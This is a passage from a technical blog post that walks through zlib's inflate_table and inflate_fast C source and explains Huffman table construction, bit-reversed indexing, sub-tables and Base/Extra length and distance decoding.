                                unsigned FAR *bits, unsigned short FAR *work) {&lt;/code&gt;&lt;p&gt;Let’s revisit &lt;code&gt;inflate_table&lt;/code&gt;’s parameters:&lt;/p&gt;&lt;quote&gt;&lt;code&gt;codetype type&lt;/code&gt;: table type (Code, Literal/Length, Distance)&lt;/quote&gt;&lt;code&gt;unsigned short FAR *lens&lt;/code&gt;: array of code lengths&lt;code&gt;unsigned codes&lt;/code&gt;: number of symbols (table entries)&lt;code&gt;code FAR * FAR *table&lt;/code&gt;: output pointer to the constructed table&lt;code&gt;unsigned FAR *bits&lt;/code&gt;: pointer to the number of index bits for the table (may be adjusted)&lt;code&gt;unsigned short FAR *work&lt;/code&gt;: scratch array for sorting, etc.&lt;code&gt;typedef struct {
    unsigned char op;           /* operation, extra bits, table bits */
    unsigned char bits;         /* bits in this part of the code */
    unsigned short val;         /* offset in table or code value */
} code;

/* op values as set by inflate_table():
    00000000 - literal
    0000tttt - table link, tttt != 0 is the number of table index bits
    0001eeee - length or distance, eeee is the number of extra bits
    01100000 - end of block
    01000000 - invalid code
 */&lt;/code&gt;&lt;p&gt;Now, the &lt;code&gt;code&lt;/code&gt; struct. The Huffman table is an array of &lt;code&gt;code&lt;/code&gt; structs; &lt;code&gt;op&lt;/code&gt; determines how to decode, &lt;code&gt;bits&lt;/code&gt; is the code length, and &lt;code&gt;val&lt;/code&gt; holds the value. As the comment indicates, these fields can play different roles depending on &lt;code&gt;op&lt;/code&gt;.&lt;/p&gt;&lt;code&gt;
    /* accumulate lengths for codes (assumes lens[] all in 0..MAXBITS) */
    for (len = 0; len &amp;lt;= MAXBITS; len++)
        count[len] = 0;
    for (sym = 0; sym &amp;lt; codes; sym++)
        count[lens[sym]]++;

    /* bound code lengths, force root to be within code lengths */
    root = *bits;
    for (max = MAXBITS; max &amp;gt;= 1; max--)
        if (count[max] != 0) break;
    if (root &amp;gt; max) root = max;
    if (max == 0) {                     /* no symbols to code at all */
        here.op = (unsigned char)64;    /* invalid code marker */
        here.bits = (unsigned char)1;
        here.val = (unsigned short)0;
        *(*table)++ = here;             /* make a table to force an error */
        *(*table)++ = here;
        *bits = 1;
        return 0;     /* no symbols, but wait for decoding to report error */
    }
    for (min = 1; min &amp;lt; max; min++)
        if (count[min] != 0) break;
    if (root &amp;lt; min) root = min;

    /* generate offsets into symbol table for each length for sorting */
    offs[1] = 0;
    for (len = 1; len &amp;lt; MAXBITS; len++)
        offs[len + 1] = offs[len] + count[len];

    /* sort symbols by length, by symbol order within each length */
    for (sym = 0; sym &amp;lt; codes; sym++)
        if (lens[sym] != 0) work[offs[lens[sym]]++] = (unsigned short)sym;&lt;/code&gt;&lt;p&gt;Let’s step through table construction. First we count, for each code length, how many symbols use that length.&lt;/p&gt;&lt;p&gt;We then determine the minimum and maximum code lengths from &lt;code&gt;count&lt;/code&gt; and set &lt;code&gt;root&lt;/code&gt;, the table’s index bit width. &lt;code&gt;root&lt;/code&gt; initially comes from the &lt;code&gt;bits&lt;/code&gt; argument but may be adjusted based on min/max. That’s why &lt;code&gt;bits&lt;/code&gt; is a pointer: any adjustments made in &lt;code&gt;inflate_table&lt;/code&gt; must also be visible to the caller.&lt;/p&gt;&lt;p&gt;The Huffman table is a simple 1D array, indexed by bits: &lt;code&gt;table[huffman_code] = decoded_value (actually a code struct to decode it)&lt;/code&gt;. Thus, &lt;code&gt;root&lt;/code&gt; is really the number of index bits—i.e., the size of the primary table. If &lt;code&gt;root=7&lt;/code&gt;, the table has entries up to &lt;code&gt;table[127(0b1111111)]&lt;/code&gt;.&lt;/p&gt;&lt;p&gt;If &lt;code&gt;root &amp;gt; max&lt;/code&gt;, set &lt;code&gt;root = max&lt;/code&gt; to avoid wasting space. If &lt;code&gt;root &amp;lt; min&lt;/code&gt;, set &lt;code&gt;root = min&lt;/code&gt;; otherwise you couldn’t store any codes at all.&lt;/p&gt;&lt;p&gt;But if &lt;code&gt;root = min&lt;/code&gt;, how do we store codes longer than &lt;code&gt;root&lt;/code&gt;? Using multi-level tables. As we’ve seen, the &lt;code&gt;op&lt;/code&gt; field can indicate a second-level lookup. For example, suppose there are ten 8‑bit codes and one 9‑bit code. You don’t want to double the table size (from 256 to 512 entries) just for one symbol. So the primary table has 256 entries; all 8‑bit codes and the prefixes of any longer codes are stored there. For longer codes, entries in the primary table point to sub-tables that hold the remaining bits.&lt;/p&gt;&lt;p&gt;We’ll see the exact mechanics below.&lt;/p&gt;&lt;p&gt;Once &lt;code&gt;root&lt;/code&gt; is decided, we build the &lt;code&gt;offs&lt;/code&gt; array to sort symbols by code length and symbol order into &lt;code&gt;work&lt;/code&gt;. The &lt;code&gt;work&lt;/code&gt; array is needed to reconstruct the full Huffman codes from the lengths.&lt;/p&gt;&lt;code&gt;A -&amp;gt; 2 (00)
B -&amp;gt; 3 (110)
C -&amp;gt; 2 (01)
D -&amp;gt; 2 (10)
E -&amp;gt; 3 (111)&lt;/code&gt;&lt;p&gt;To reconstruct codes from lengths, group symbols with the same length and assign codes in order:&lt;/p&gt;&lt;code&gt;A -&amp;gt; 2 (00)
C -&amp;gt; 2 (01)
D -&amp;gt; 2 (10)
B -&amp;gt; 3 (110)
E -&amp;gt; 3 (111)&lt;/code&gt;&lt;p&gt;&lt;code&gt;work&lt;/code&gt; is the array that encodes this ordering; the build loop will walk &lt;code&gt;work&lt;/code&gt; to assign codes.&lt;/p&gt;&lt;code&gt;    /* set up for code type */
    switch (type) {
    case CODES:
        base = extra = work;    /* dummy value--not used */
        match = 20;
        break;
    case LENS:
        base = lbase;
        extra = lext;
        match = 257;
        break;
    default:    /* DISTS */
        base = dbase;
        extra = dext;
        match = 0;
    }&lt;/code&gt;&lt;p&gt;Depending on &lt;code&gt;type&lt;/code&gt;, we set &lt;code&gt;match&lt;/code&gt;, &lt;code&gt;base&lt;/code&gt;, and &lt;code&gt;extra&lt;/code&gt;. These support the Base/Extra decoding mode described below.&lt;/p&gt;&lt;p&gt;Dynamic Huffman table lengths in the stream are usually stored by position (index), since that index is the original value—e.g., index 65 corresponds to ‘A’. This is efficient for literals (0–255). But what about LZ77 length/distance values? Deflate specifies length range 3–258 and distance range 1–32,768, making a direct per‑value table impractical. So lengths and distances use Base/Extra coding.&lt;/p&gt;&lt;p&gt;&lt;code&gt;match&lt;/code&gt; indicates where Base/Extra decoding begins. For Literal/Length, 0–255 are literals and 256 is End of Block; from 257 upward (LZ77 lengths), Base/Extra applies—so &lt;code&gt;match=257&lt;/code&gt;. The Code table doesn’t use Base/Extra at all, so &lt;code&gt;match=20&lt;/code&gt; (greater than the largest code index). Distance uses Base/Extra for all symbols, so &lt;code&gt;match=0&lt;/code&gt;.&lt;/p&gt;&lt;p&gt;&lt;code&gt;base&lt;/code&gt; and &lt;code&gt;extra&lt;/code&gt; select the arrays used for Base/Extra depending on whether we’re building the length or distance table.&lt;/p&gt;&lt;code&gt;    /* initialize state for loop */
    huff = 0;                   /* starting code */
    sym = 0;                    /* starting code symbol */
    len = min;                  /* starting code length */
    next = *table;              /* current table to fill in */
    curr = root;                /* current table index bits */
    drop = 0;                   /* current bits to drop from code for index */
    low = (unsigned)(-1);       /* trigger new sub-table when len &amp;gt; root */
    used = 1U &amp;lt;&amp;lt; root;          /* use root table entries */
    mask = used - 1;            /* mask for comparing low */

    /* process all codes and make table entries */
    for (;;) {
        /* create table entry */
        here.bits = (unsigned char)(len - drop);
        if (work[sym] + 1U &amp;lt; match) {
            here.op = (unsigned char)0;
            here.val = work[sym];
        }
        else if (work[sym] &amp;gt;= match) {
            here.op = (unsigned char)(extra[work[sym] - match]);
            here.val = base[work[sym] - match];
        }
        else {
            here.op = (unsigned char)(32 + 64);         /* end of block */
            here.val = 0;
        }
&lt;/code&gt;&lt;p&gt;This is the main construction loop. We iterate through &lt;code&gt;work&lt;/code&gt;, creating a &lt;code&gt;code&lt;/code&gt; entry for each symbol. If &lt;code&gt;symbol+1 &amp;lt; match&lt;/code&gt;, it’s a normal entry: &lt;code&gt;op=0&lt;/code&gt;, &lt;code&gt;val=symbol&lt;/code&gt;. As we saw in &lt;code&gt;case LIT:&lt;/code&gt;, decoding such an entry emits &lt;code&gt;val&lt;/code&gt;.&lt;/p&gt;&lt;quote&gt;&lt;p&gt;Recall: “original value” here means the Huffman-decoded value. In the simple case above, it’s the final literal; with Base/Extra, it’s a special symbol that needs further interpretation.&lt;/p&gt;&lt;/quote&gt;&lt;p&gt;If &lt;code&gt;symbol &amp;gt;= match&lt;/code&gt;, we create an entry using the Base/Extra scheme: &lt;code&gt;op&lt;/code&gt; holds the number of extra bits, &lt;code&gt;val&lt;/code&gt; holds the base.&lt;/p&gt;&lt;code&gt;            state-&amp;gt;length = (unsigned)here.val;
            if ((int)(here.op) == 0) {
                Tracevv((stderr, here.val &amp;gt;= 0x20 &amp;amp;&amp;amp; here.val &amp;lt; 0x7f ?
                        "inflate:         literal '%c'\n" :
                        "inflate:         literal 0x%02x\n", here.val));
                state-&amp;gt;mode = LIT;
                break;
            }
            if (here.op &amp;amp; 32) {
                Tracevv((stderr, "inflate:         end of block\n"));
                state-&amp;gt;back = -1;
                state-&amp;gt;mode = TYPE;
                break;
            }
            if (here.op &amp;amp; 64) {
                strm-&amp;gt;msg = (z_const char *)"invalid literal/length code";
                state-&amp;gt;mode = BAD;
                break;
            }
            state-&amp;gt;extra = (unsigned)(here.op) &amp;amp; 15;
            state-&amp;gt;mode = LENEXT;
                /* fallthrough */
        case LENEXT:
            if (state-&amp;gt;extra) {
                NEEDBITS(state-&amp;gt;extra);
                state-&amp;gt;length += BITS(state-&amp;gt;extra);
                DROPBITS(state-&amp;gt;extra);
                state-&amp;gt;back += state-&amp;gt;extra;
            }
            Tracevv((stderr, "inflate:         length %u\n", state-&amp;gt;length));
            state-&amp;gt;was = state-&amp;gt;length;
            state-&amp;gt;mode = DIST;
                /* fallthrough */&lt;/code&gt;&lt;p&gt;To understand Base/Extra, look at the length-decoding routine in &lt;code&gt;inflate&lt;/code&gt;. First, &lt;code&gt;state-&amp;gt;length = here.val&lt;/code&gt; (the base). Then, based on &lt;code&gt;op&lt;/code&gt;, if it’s not a literal/end/invalid, we go to length decoding.&lt;/p&gt;&lt;p&gt;&lt;code&gt;op &amp;amp; 15&lt;/code&gt; extracts the number of extra bits. We then read that many bits and add them to the base to get the final length.&lt;/p&gt;&lt;quote&gt;&lt;p&gt;The&lt;/p&gt;&lt;code&gt;op &amp;amp; 15&lt;/code&gt;is necessary because the&lt;code&gt;lext&lt;/code&gt;/&lt;code&gt;dext&lt;/code&gt;arrays encode flags along with the count of extra bits.&lt;/quote&gt;&lt;code&gt;    static const unsigned short lbase[31] = { /* Length codes 257..285 base */
        3, 4, 5, 6, 7, 8, 9, 10, 11, 13, 15, 17, 19, 23, 27, 31,
        35, 43, 51, 59, 67, 83, 99, 115, 131, 163, 195, 227, 258, 0, 0};
    static const unsigned short lext[31] = { /* Length codes 257..285 extra */
        16, 16, 16, 16, 16, 16, 16, 16, 17, 17, 17, 17, 18, 18, 18, 18,
        19, 19, 19, 19, 20, 20, 20, 20, 21, 21, 21, 21, 16, 73, 200};
    static const unsigned short dbase[32] = { /* Distance codes 0..29 base */
        1, 2, 3, 4, 5, 7, 9, 13, 17, 25, 33, 49, 65, 97, 129, 193,
        257, 385, 513, 769, 1025, 1537, 2049, 3073, 4097, 6145,
        8193, 12289, 16385, 24577, 0, 0};
    static const unsigned short dext[32] = { /* Distance codes 0..29 extra */
        16, 16, 16, 16, 17, 17, 18, 18, 19, 19, 20, 20, 21, 21, 22, 22,
        23, 23, 24, 24, 25, 25, 26, 26, 27, 27,
        28, 28, 29, 29, 64, 64};&lt;/code&gt;&lt;p&gt;For example, suppose we want to decode length 20. Its code length entry would be at &lt;code&gt;huffman_table[269]&lt;/code&gt;.&lt;/p&gt;&lt;code&gt;here.op = extra - match](257) = extra[12] = lext[12] = 18
here.val = base - match(257)] = base[12] = lbase[12] = 19&lt;/code&gt;&lt;p&gt;The length routine then computes &lt;code&gt;state-&amp;gt;length = 19 + BITS(18 &amp;amp; 15 (2))&lt;/code&gt;. If the stream provides &lt;code&gt;01&lt;/code&gt; as the extra bits, we decode &lt;code&gt;19 + 1 = 20&lt;/code&gt;.&lt;/p&gt;&lt;p&gt;The key idea of Base/Extra: values like 20 (and the range &lt;code&gt;19 + 0b00 ~ 0b11&lt;/code&gt;) are all represented by the same Huffman symbol (index 269); the exact value is determined by reading the extra bits. The table groups ranges by base and uses extra bits to resolve within the range.&lt;/p&gt;&lt;code&gt;        /* replicate for those indices with low len bits equal to huff */
        incr = 1U &amp;lt;&amp;lt; (len - drop);
        fill = 1U &amp;lt;&amp;lt; curr;
        min = fill;                 /* save offset to next table */
        do {
            fill -= incr;
            next[(huff &amp;gt;&amp;gt; drop) + fill] = here;
        } while (fill != 0);

        /* backwards increment the len-bit code huff */
        incr = 1U &amp;lt;&amp;lt; (len - 1);
        while (huff &amp;amp; incr)
            incr &amp;gt;&amp;gt;= 1;
        if (incr != 0) {
            huff &amp;amp;= incr - 1;
            huff += incr;
        }
        else
            huff = 0;

        /* go to next symbol, update count, len */
        sym++;
        if (--(count[len]) == 0) {
            if (len == max) break;
            len = lens[work[sym]];
        }&lt;/code&gt;&lt;p&gt;After creating a &lt;code&gt;code&lt;/code&gt; entry, we write it into the table at multiple positions. &lt;code&gt;drop&lt;/code&gt; is used for sub-tables (multi-level); it’s 0 in the primary table.&lt;/p&gt;&lt;p&gt;The loop writes &lt;code&gt;here&lt;/code&gt; into &lt;code&gt;next[huff + (0, incr, incr*2, …, fill-incr)]&lt;/code&gt;. Before explaining why, let’s note something important:&lt;/p&gt;&lt;code&gt;A -&amp;gt; 00
B -&amp;gt; 01
C -&amp;gt; 10
D -&amp;gt; 110
E -&amp;gt; 111&lt;/code&gt;&lt;p&gt;If we naively stored:&lt;/p&gt;&lt;code&gt;next[0(0b00)] = here(op=0, bits=2, val='A')
next[1(0b01)] = here(op=0, bits=2, val='B')
next[2(0b10)] = here(op=0, bits=2, val='C')
next[6(0b110)] = here(op=0, bits=3, val='D')
next[7(0b111)] = here(op=0, bits=3, val='E')&lt;/code&gt;&lt;p&gt;that looks reasonable—but it’s wrong.&lt;/p&gt;&lt;p&gt;Consider compressing “CB”:&lt;/p&gt;&lt;code&gt;0b10(C) &amp;lt;&amp;lt; 0 + 0b01(B) &amp;lt;&amp;lt; 2 = 0b0110&lt;/code&gt;&lt;quote&gt;&lt;p&gt;Bits are packed least significant bit first; simply concatenating as&lt;/p&gt;&lt;code&gt;0b1001&lt;/code&gt;would make bitwise decoding impossible.&lt;/quote&gt;&lt;p&gt;The compressed bits for &lt;code&gt;CB&lt;/code&gt; (0b0110) match those for &lt;code&gt;D&lt;/code&gt; (0b110). Even though the code set is prefix-free when read left-to-right, Deflate uses a bitstream where the trailing bits act as prefixes due to LSB-first packing. To handle this, we reverse the bit order when building indices:&lt;/p&gt;&lt;code&gt;next[0(0b00)] = here(op=0, bits=2, val='A')
next[2(0b10)] = here(op=0, bits=2, val='B')
next[1(0b01)] = here(op=0, bits=2, val='C')
next[3(0b011)] = here(op=0, bits=3, val='D')
next[7(0b111)] = here(op=0, bits=3, val='E')&lt;/code&gt;&lt;p&gt;So the correct index order is 0,2,1,3,7 rather than 0,1,2,6,7.&lt;/p&gt;&lt;code&gt;        /* replicate for those indices with low len bits equal to huff */
        incr = 1U &amp;lt;&amp;lt; (len - drop);
        fill = 1U &amp;lt;&amp;lt; curr;
        min = fill;                 /* save offset to next table */
        do {
            fill -= incr;
            next[(huff &amp;gt;&amp;gt; drop) + fill] = here;
        } while (fill != 0);&lt;/code&gt;&lt;p&gt;Back to the loop. &lt;code&gt;huff&lt;/code&gt; holds the (bit-reversed) Huffman code in progress. We don’t just store at &lt;code&gt;next[huff]&lt;/code&gt;; we fill out all positions differing only in the unused high bits of the primary table.&lt;/p&gt;&lt;p&gt;&lt;code&gt;fill&lt;/code&gt; is &lt;code&gt;1 &amp;lt;&amp;lt; curr&lt;/code&gt; (table size), and &lt;code&gt;incr&lt;/code&gt; is &lt;code&gt;1 &amp;lt;&amp;lt; len&lt;/code&gt; (or &lt;code&gt;1 &amp;lt;&amp;lt; (len - drop)&lt;/code&gt; for sub-tables). So the effect is:&lt;/p&gt;&lt;quote&gt;&lt;p&gt;If the primary table has&lt;/p&gt;&lt;code&gt;curr=root&lt;/code&gt;bits, and&lt;code&gt;huff=0b111&lt;/code&gt;with code length 3, then fill covers:&lt;/quote&gt;&lt;p&gt;We’re enumerating the higher bits that are irrelevant to this code length. This allows constant-time decoding:&lt;/p&gt;&lt;code&gt;next[0(0b00), 4(0b100)] = here(op=0, bits=2, val='A')
next[2(0b10), 6(0b110)] = here(op=0, bits=2, val='B')
next[1(0b01), 6(0b101)] = here(op=0, bits=2, val='C')
next[3(0b011)] = here(op=0, bits=3, val='D')
next[7(0b111)] = here(op=0, bits=3, val='E')&lt;/code&gt;&lt;p&gt;When decoding &lt;code&gt;AC&lt;/code&gt; (0b0100), we can immediately index &lt;code&gt;next[0b100]&lt;/code&gt; with &lt;code&gt;BITS(root)&lt;/code&gt; and decode ‘A’ without checking code lengths; then drop 2 bits and continue.&lt;/p&gt;&lt;p&gt;Back to the actual decoding:&lt;/p&gt;&lt;code&gt;here = state-&amp;gt;lencode[BITS(state-&amp;gt;lenbits)];&lt;/code&gt;&lt;p&gt;This implements the same idea: index with fixed &lt;code&gt;lenbits&lt;/code&gt; and decode immediately. The &lt;code&gt;while&lt;/code&gt; loop plus &lt;code&gt;fill/incr&lt;/code&gt; achieve this optimization.&lt;/p&gt;&lt;code&gt;        /* backwards increment the len-bit code huff */
        incr = 1U &amp;lt;&amp;lt; (len - 1);
        while (huff &amp;amp; incr)
            incr &amp;gt;&amp;gt;= 1;
        if (incr != 0) {
            huff &amp;amp;= incr - 1;
            huff += incr;
        }
        else
            huff = 0;&lt;/code&gt;&lt;p&gt;This updates &lt;code&gt;huff&lt;/code&gt; in bit-reversed order:&lt;/p&gt;&lt;code&gt;00,01,10,110,111 -&amp;gt; X
00,10,01,011,111 -&amp;gt; O&lt;/code&gt;&lt;p&gt;i.e., increment with bit-reversed semantics.&lt;/p&gt;&lt;code&gt;        /* go to next symbol, update count, len */
        sym++;
        if (--(count[len]) == 0) {
            if (len == max) break;
            len = lens[work[sym]];
        }&lt;/code&gt;&lt;p&gt;Move to the next symbol and update the working code length.&lt;/p&gt;&lt;code&gt;        /* create new sub-table if needed */
        if (len &amp;gt; root &amp;amp;&amp;amp; (huff &amp;amp; mask) != low) {
            /* if first time, transition to sub-tables */
            if (drop == 0)
                drop = root;

            /* increment past last table */
            next += min;            /* here min is 1 &amp;lt;&amp;lt; curr */

            /* determine length of next table */
            curr = len - drop;
            left = (int)(1 &amp;lt;&amp;lt; curr);
            while (curr + drop &amp;lt; max) {
                left -= count[curr + drop];
                if (left &amp;lt;= 0) break;
                curr++;
                left &amp;lt;&amp;lt;= 1;
            }

            /* check for enough space */
            used += 1U &amp;lt;&amp;lt; curr;

            /* point entry in root table to sub-table */
            low = huff &amp;amp; mask;
            (*table)[low].op = (unsigned char)curr;
            (*table)[low].bits = (unsigned char)root;
            (*table)[low].val = (unsigned short)(next - *table);
        }
    }&lt;/code&gt;&lt;p&gt;This creates a sub-table when &lt;code&gt;len &amp;gt; root&lt;/code&gt;.&lt;/p&gt;&lt;p&gt;Let’s illustrate with the earlier example:&lt;/p&gt;&lt;code&gt;next[0(0b00), 4(0b100)] = here(op=0, bits=2, val='A')
next[2(0b10), 6(0b110)] = here(op=0, bits=2, val='B')
next[1(0b01), 5(0b101)] = here(op=0, bits=2, val='C')
next[3(0b011)] = here(op=0, bits=3, val='D')
next[7(0b111)] = here(op=0, bits=3, val='E')&lt;/code&gt;&lt;p&gt;Assume &lt;code&gt;root=2&lt;/code&gt; (for illustration), so 3‑bit codes require a sub-table.&lt;/p&gt;&lt;quote&gt;&lt;p&gt;Due to default&lt;/p&gt;&lt;code&gt;state-&amp;gt;lenbits&lt;/code&gt;, you wouldn’t actually see&lt;code&gt;root=2&lt;/code&gt;with multi-level tables in practice; we’re using small numbers for clarity.&lt;/quote&gt;&lt;code&gt;next[0(0b00)] = here(op=0, bits=2, val='A')
next[2(0b10)] = here(op=0, bits=2, val='B')
next[1(0b01)] = here(op=0, bits=2, val='C')&lt;/code&gt;&lt;p&gt;Codes of length ≤2 fit in the primary table.&lt;/p&gt;&lt;code&gt;            if (drop == 0)
                drop = root;

            /* increment past last table */
            next += min;            /* here min is 1 &amp;lt;&amp;lt; curr */&lt;/code&gt;&lt;p&gt;We set &lt;code&gt;drop&lt;/code&gt; (the number of lower bits to ignore when indexing sub-tables) and advance &lt;code&gt;next&lt;/code&gt; to the end of the current table—this is where the sub-table will live.&lt;/p&gt;&lt;p&gt;Now the sub-table is ready: &lt;code&gt;next&lt;/code&gt; points to it, and &lt;code&gt;drop=root&lt;/code&gt; causes future &lt;code&gt;huff&lt;/code&gt; indices to ignore the lower &lt;code&gt;root&lt;/code&gt; bits.&lt;/p&gt;&lt;p&gt;On subsequent iterations, entries for the longer codes are placed into the sub-table:&lt;/p&gt;&lt;code&gt;next += 1 &amp;lt;&amp;lt; curr
next[0(0b011 &amp;gt;&amp;gt; 2)] = here(op=0, bits=1 (3-2), val='D')
next[1(0b111 &amp;gt;&amp;gt; 2)] = here(op=0, bits=1 (3-2), val='E')&lt;/code&gt;&lt;p&gt;Note &lt;code&gt;here.bits = len - drop&lt;/code&gt;, so the sub-table stores only the remaining bits.&lt;/p&gt;&lt;code&gt;            /* point entry in root table to sub-table */
            low = huff &amp;amp; mask;
            (*table)[low].op = (unsigned char)curr;
            (*table)[low].bits = (unsigned char)root;
            (*table)[low].val = (unsigned short)(next - *table);&lt;/code&gt;&lt;p&gt;We also write into the primary table an entry that points to the sub-table. The final multi-level table looks like:&lt;/p&gt;&lt;code&gt;next[0(0b00)] = here(op=0, bits=2, val='A')
next[2(0b10)] = here(op=0, bits=2, val='B')
next[1(0b01)] = here(op=0, bits=2, val='C')

next[3(0b011 &amp;amp; mask( (1 &amp;lt;&amp;lt; 2) - 1) )] = here(op=2, bits=2, val=4)

next += 1 &amp;lt;&amp;lt; curr
next[0(0b011 &amp;gt;&amp;gt; 2)] = here(op=0, bits=1 (3-2), val='D')
next[1(0b111 &amp;gt;&amp;gt; 2)] = here(op=0, bits=1 (3-2), val='E')&lt;/code&gt;&lt;p&gt;Decoding a 3‑bit code like ‘E’ works like this: first-level lookup at &lt;code&gt;0b011 &amp;amp; mask = 0b11&lt;/code&gt; yields &lt;code&gt;here(op=2, bits=2, val=4)&lt;/code&gt;, so we consume 2 bits and jump to the sub-table (&lt;code&gt;next += 4&lt;/code&gt;). Then we use the next bit (1) to index the sub-table, yielding &lt;code&gt;here(op=0, bits=1, val='E')&lt;/code&gt;; we consume 1 bit and emit ‘E’.&lt;/p&gt;&lt;code&gt;    /* fill in remaining table entry if code is incomplete (guaranteed to have
       at most one remaining entry, since if the code is incomplete, the
       maximum code length that was allowed to get this far is one bit) */
    if (huff != 0) {
        here.op = (unsigned char)64;            /* invalid code marker */
        here.bits = (unsigned char)(len - drop);
        here.val = (unsigned short)0;
        next[huff] = here;
    }

    /* set return parameters */
    *table += used;
    *bits = root;
    return 0;&lt;/code&gt;&lt;p&gt;Finally, if the code set is incomplete, the remaining entry is filled with an invalid code marker, then &lt;code&gt;bits&lt;/code&gt; is updated and the function returns.&lt;/p&gt;&lt;code&gt;void ZLIB_INTERNAL inflate_fast(z_streamp strm, unsigned start) {
    struct inflate_state FAR *state;
    z_const unsigned char FAR *in;      /* local strm-&amp;gt;next_in */
    z_const unsigned char FAR *last;    /* have enough input while in &amp;lt; last */
    unsigned char FAR *out;     /* local strm-&amp;gt;next_out */
    unsigned char FAR *beg;     /* inflate()'s initial strm-&amp;gt;next_out */
    unsigned char FAR *end;     /* while out &amp;lt; end, enough space available */
#ifdef INFLATE_STRICT
    unsigned dmax;              /* maximum distance from zlib header */
#endif
    unsigned wsize;             /* window size or zero if not using window */
    unsigned whave;             /* valid bytes in the window */
    unsigned wnext;             /* window write index */
    unsigned char FAR *window;  /* allocated sliding window, if wsize != 0 */
    unsigned long hold;         /* local strm-&amp;gt;hold */
    unsigned bits;              /* local strm-&amp;gt;bits */
    code const FAR *lcode;      /* local strm-&amp;gt;lencode */
    code const FAR *dcode;      /* local strm-&amp;gt;distcode */
    unsigned lmask;             /* mask for first level of length codes */
    unsigned dmask;             /* mask for first level of distance codes */
    code const *here;           /* retrieved table entry */
    unsigned op;                /* code bits, operation, extra bits, or */
                                /*  window position, window bytes to copy */
    unsigned len;               /* match length, unused bytes */
    unsigned dist;              /* match distance */
    unsigned char FAR *from;    /* where to copy match from */

    /* copy state to local variables */
    state = (struct inflate_state FAR *)strm-&amp;gt;state;
    in = strm-&amp;gt;next_in;
    last = in + (strm-&amp;gt;avail_in - 5);
    out = strm-&amp;gt;next_out;
    beg = out - (start - strm-&amp;gt;avail_out);
    end = out + (strm-&amp;gt;avail_out - 257);
#ifdef INFLATE_STRICT
    dmax = state-&amp;gt;dmax;
#endif
    wsize = state-&amp;gt;wsize;
    whave = state-&amp;gt;whave;
    wnext = state-&amp;gt;wnext;
    window = state-&amp;gt;window;
    hold = state-&amp;gt;hold;
    bits = state-&amp;gt;bits;
    lcode = state-&amp;gt;lencode;
    dcode = state-&amp;gt;distcode;
    lmask = (1U &amp;lt;&amp;lt; state-&amp;gt;lenbits) - 1;
    dmask = (1U &amp;lt;&amp;lt; state-&amp;gt;distbits) - 1;&lt;/code&gt;&lt;p&gt;Time to analyze &lt;code&gt;inflate_fast&lt;/code&gt;.&lt;/p&gt;&lt;code&gt;    do {
        if (bits &amp;lt; 15) {
            hold += (unsigned long)(*in++) &amp;lt;&amp;lt; bits;
            bits += 8;
            hold += (unsigned long)(*in++) &amp;lt;&amp;lt; bits;
            bits += 8;
        }
.....
.....
.....
    } while (in &amp;lt; last &amp;amp;&amp;amp; out &amp;lt; end);&lt;/code&gt;&lt;p&gt;It loops until the preconditions fail. At the start of each iteration, if fewer than 15 bits are available in &lt;code&gt;hold&lt;/code&gt;, it preloads 16 bits. This reduces overhead in the inner loop.&lt;/p&gt;&lt;code&gt;        here = lcode + (hold &amp;amp; lmask);
      dolen:
        op = (unsigned)(here-&amp;gt;bits);
        hold &amp;gt;&amp;gt;= op;
        bits -= op;
        op = (unsigned)(here-&amp;gt;op);
        if (op == 0) {                          /* literal */
            Tracevv((stderr, here-&amp;gt;val &amp;gt;= 0x20 &amp;amp;&amp;amp; here-&amp;gt;val &amp;lt; 0x7f ?
                    "inflate:         literal '%c'\n" :
                    "inflate:         literal 0x%02x\n", here-&amp;gt;val));
            *out++ = (unsigned char)(here-&amp;gt;val);
        }
        else if (op &amp;amp; 16) {                     /* length base */
            len = (unsigned)(here-&amp;gt;val);
            op &amp;amp;= 15;                           /* number of extra bits */
            if (op) {
                if (bits &amp;lt; op) {
                    hold += (unsigned long)(*in++) &amp;lt;&amp;lt; bits;
                    bits += 8;
                }
                len += (unsigned)hold &amp;amp; ((1U &amp;lt;&amp;lt; op) - 1);
                hold &amp;gt;&amp;gt;= op;
                bits -= op;
            }
            Tracevv((stderr, "inflate:         length %u\n", len));
            if (bits &amp;lt; 15) {
                hold += (unsigned long)(*in++) &amp;lt;&amp;lt; bits;
                bits += 8;
                hold += (unsigned long)(*in++) &amp;lt;&amp;lt; bits;
                bits += 8;
            }&lt;/code&gt;&lt;p&gt;The logic mirrors &lt;code&gt;inflate.c&lt;/code&gt;: look up a &lt;code&gt;code&lt;/code&gt; in &lt;code&gt;lcode&lt;/code&gt;. If it’s a literal, emit it and continue; if it’s a length, decode the length and then decode the distance next, preloading more bits first.&lt;/p&gt;&lt;code&gt;            here = dcode + (hold &amp;amp; dmask);
          dodist:
            op = (unsigned)(here-&amp;gt;bits);
            hold &amp;gt;&amp;gt;= op;
            bits -= op;
            op = (unsigned)(here-&amp;gt;op);
            if (op &amp;amp; 16) {                      /* distance base */
                dist = (unsigned)(here-&amp;gt;val);
                op &amp;amp;= 15;                       /* number of extra bits */
                if (bits &amp;lt; op) {
                    hold += (unsigned long)(*in++) &amp;lt;&amp;lt; bits;
                    bits += 8;
                    if (bits &amp;lt; op) {
                        hold += (unsigned long)(*in++) &amp;lt;&amp;lt; bits;
                        bits += 8;
                    }
                }
                dist += (unsigned)hold &amp;amp; ((1U &amp;lt;&amp;lt; op) - 1);
#ifdef INFLATE_STRICT
                if (dist &amp;gt; dmax) {
                    strm-&amp;gt;msg = (z_const char *)"invalid distance too far back";
                    state-&amp;gt;mode = BAD;
                    break;
                }
#endif
                hold &amp;gt;&amp;gt;= op;
                bits -= op;
                Tracevv((stderr, "inflate:         distance %u\n", dist));&lt;/code&gt;&lt;p&gt;Distance decoding follows. After that, the LZ77 copy routine (not shown here) copies bytes from the window; the code is messy because it optimizes for various cases.&lt;/p&gt;&lt;code&gt;            else if ((op &amp;amp; 64) == 0) {          /* 2nd level distance code */
                here = dcode + here-&amp;gt;val + (hold &amp;amp; ((1U &amp;lt;&amp;lt; op) - 1));
                goto dodist;
            }
            else {
                strm-&amp;gt;msg = (z_const char *)"invalid distance code";
                state-&amp;gt;mode = BAD;
                break;
            }
        }
        else if ((op &amp;amp; 64) == 0) {              /* 2nd level length code */
            here = lcode + here-&amp;gt;val + (hold &amp;amp; ((1U &amp;lt;&amp;lt; op) - 1));
            goto dolen;
        }
        else if (op &amp;amp; 32) {                     /* end-of-block */
            Tracevv((stderr, "inflate:         end of block\n"));
            state-&amp;gt;mode = TYPE;
            break;
        }
        else {
            strm-&amp;gt;msg = (z_const char *)"invalid literal/length code";
            state-&amp;gt;mode = BAD;
            break;
